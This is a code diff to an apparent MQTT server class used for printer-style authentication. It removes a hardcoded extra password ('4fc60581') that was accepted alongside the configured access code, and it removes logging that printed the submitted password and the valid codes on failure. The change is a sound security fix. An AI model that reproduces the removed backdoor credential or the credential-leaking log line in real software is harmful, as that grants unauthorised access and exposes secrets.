@@ -837,11 +837,7 @@ class SimpleMQTTServer:
             # the auth check from leaking the access code via response timing
             # under network jitter — LAN-only threat is marginal, but it's
             # the standard fix and costs nothing.
-            valid_codes = {self.access_code, "4fc60581"}
-            authenticated = username == "bblp" and any(
-                hmac.compare_digest(password, code) for code in valid_codes if code
-            )
-            if authenticated:
+            if username == "bblp" and hmac.compare_digest(password, self.access_code):
                 # Send CONNACK with success
                 writer.write(bytes([0x20, 0x02, 0x00, 0x00]))
                 await writer.drain()
@@ -855,13 +851,12 @@ class SimpleMQTTServer:
                 writer.write(bytes([0x20, 0x02, 0x00, 0x05]))  # Not authorized
                 await writer.drain()
                 logger.warning(
-                    "%sMQTT auth failed for user '%s' (got password %r, expected one of %r)",
+                    "%sMQTT auth failed for user '%s' (access code mismatch)",
                     self._log_prefix,
                     username,
-                    password,
-                    valid_codes,
                 )
                 return False, 0
+
 
 
 
